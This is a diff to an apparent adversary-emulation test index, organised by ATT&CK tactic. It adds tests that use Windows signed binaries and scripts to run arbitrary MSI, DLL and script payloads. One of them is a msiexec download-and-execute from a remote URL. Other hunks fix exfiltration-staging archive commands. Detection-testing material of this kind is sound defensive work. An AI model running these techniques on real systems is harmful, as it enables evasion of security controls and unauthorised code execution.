@@ -10237,6 +10237,66 @@ defense-evasion:
         name: command_prompt
         command: "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}
           \n"
+    - name: Msiexec.exe - Execute Local MSI file
+      description: 'Execute arbitrary MSI file. Commonly seen in application installation.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        msi_payload:
+          description: MSI file to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218.msi
+      executor:
+        name: command_prompt
+        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+    - name: Msiexec.exe - Execute Remote MSI file
+      description: 'Execute arbitrary MSI file retrieved remotely. Less commonly seen
+        in application installation, commonly seen in malware execution.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        msi_payload:
+          description: MSI file to execute
+          type: String
+          default: http://site.com/file.msi
+      executor:
+        name: command_prompt
+        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+    - name: Msiexec.exe - Execute Arbitrary DLL
+      description: 'Execute arbitrary DLL file stored locally. Commonly seen in application
+        installation.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      executor:
+        name: command_prompt
+        command: "msiexec.exe /y \"#{dll_payload}\" \n"
+    - name: Odbcconf.exe - Execute Arbitrary DLL
+      description: 'Execute arbitrary DLL file stored locally.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      executor:
+        name: command_prompt
+        command: 'odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
+
+'
   T1216:
     technique:
       x_mitre_data_sources:
@@ -10308,6 +10368,46 @@ defense-evasion:
           localhost "script:#{remote_payload}"
 
 '
+    - name: SyncAppvPublishingServe Signed Script PowerShell Command Execution
+      description: 'Executes the signed SyncAppvPublishingServe script with options
+        to execute an arbitrary PowerShell command.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: A PowerShell command to execute.
+          type: string
+          default: Start-Process calc
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'C:\windows\system32\SyncAppvPublishingServe.vbs “\n;#{command_to_execute}”
+
+'
+    - name: manage-bde.wsf Signed Script Command Execution
+      description: 'Executes the signed manage-bde.wsf script with options to execute
+        an arbitrary command.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: A command to execute.
+          type: Path
+          default: C:\Windows\System32\calc.exe
+      executor:
+        name: command_prompt
+        elevation_required: false
+        prereq_command: 'set comspec=#{command_to_execute}
+
+'
+        command: 'cscript manage-bde.wsf
+
+'
+        cleanup_command: set comspec=C:\Windows\System32\cmd.exe
   T1151:
     technique:
       x_mitre_data_sources:
@@ -20397,6 +20497,66 @@ execution:
         name: command_prompt
         command: "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}
           \n"
+    - name: Msiexec.exe - Execute Local MSI file
+      description: 'Execute arbitrary MSI file. Commonly seen in application installation.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        msi_payload:
+          description: MSI file to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218.msi
+      executor:
+        name: command_prompt
+        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+    - name: Msiexec.exe - Execute Remote MSI file
+      description: 'Execute arbitrary MSI file retrieved remotely. Less commonly seen
+        in application installation, commonly seen in malware execution.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        msi_payload:
+          description: MSI file to execute
+          type: String
+          default: http://site.com/file.msi
+      executor:
+        name: command_prompt
+        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+    - name: Msiexec.exe - Execute Arbitrary DLL
+      description: 'Execute arbitrary DLL file stored locally. Commonly seen in application
+        installation.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      executor:
+        name: command_prompt
+        command: "msiexec.exe /y \"#{dll_payload}\" \n"
+    - name: Odbcconf.exe - Execute Arbitrary DLL
+      description: 'Execute arbitrary DLL file stored locally.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      executor:
+        name: command_prompt
+        command: 'odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
+
+'
   T1216:
     technique:
       x_mitre_data_sources:
@@ -20468,6 +20628,46 @@ execution:
           localhost "script:#{remote_payload}"
 
 '
+    - name: SyncAppvPublishingServe Signed Script PowerShell Command Execution
+      description: 'Executes the signed SyncAppvPublishingServe script with options
+        to execute an arbitrary PowerShell command.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: A PowerShell command to execute.
+          type: string
+          default: Start-Process calc
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'C:\windows\system32\SyncAppvPublishingServe.vbs “\n;#{command_to_execute}”
+
+'
+    - name: manage-bde.wsf Signed Script Command Execution
+      description: 'Executes the signed manage-bde.wsf script with options to execute
+        an arbitrary command.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: A command to execute.
+          type: Path
+          default: C:\Windows\System32\calc.exe
+      executor:
+        name: command_prompt
+        elevation_required: false
+        prereq_command: 'set comspec=#{command_to_execute}
+
+'
+        command: 'cscript manage-bde.wsf
+
+'
+        cleanup_command: set comspec=C:\Windows\System32\cmd.exe
   T1153:
     technique:
       x_mitre_data_sources:
@@ -21099,7 +21299,7 @@ execution:
           default: ipconfig
       executor:
         name: powershell
-        command: 'invoke-command -computer_name #{host_name} -scriptblock {#{remote_command}}
+        command: 'invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}
 
 '
   T1220:
@@ -22364,7 +22564,7 @@ lateral-movement:
           default: ipconfig
       executor:
         name: powershell
-        command: 'invoke-command -computer_name #{host_name} -scriptblock {#{remote_command}}
+        command: 'invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}
 
 '
 collection:
@@ -23344,9 +23544,9 @@ exfiltration:
         name: command_prompt
         elevation_required: false
         command: |
-          mkdir ./tmp/victim-files
-          cd ./tmp/victim-files
-          echo "This file will be encrypted" > ./encrypted_file.txt
+          mkdir .\tmp\victim-files
+          cd .\tmp\victim-files
+          echo "This file will be encrypted" > .\encrypted_file.txt
           rar a -hp"blue" hello.rar
           dir
     - name: Compress Data and lock with password for Exfiltration with winzip
@@ -23360,9 +23560,9 @@ exfiltration:
         elevation_required: false
         command: |
           path=%path%;"C:\Program Files (x86)\winzip"
-          mkdir ./tmp/victim-files
-          cd ./tmp/victim-files
-          echo "This file will be encrypted" > ./encrypted_file.txt
+          mkdir .\tmp\victim-files
+          cd .\tmp\victim-files
+          echo "This file will be encrypted" > .\encrypted_file.txt
           winzip32 -min -a -s"hello" archive.zip *
           dir
     - name: Compress Data and lock with password for Exfiltration with 7zip
@@ -23375,9 +23575,9 @@ exfiltration:
         name: command_prompt
         elevation_required: false
         command: |
-          mkdir ./tmp/victim-files
-          cd ./tmp/victim-files
-          echo "This file will be encrypted" > ./encrypted_file.txt
+          mkdir .\tmp\victim-files
+          cd .\tmp\victim-files
+          echo "This file will be encrypted" > .\encrypted_file.txt
           7z a archive.7z -pblue
           dir
   T1030:
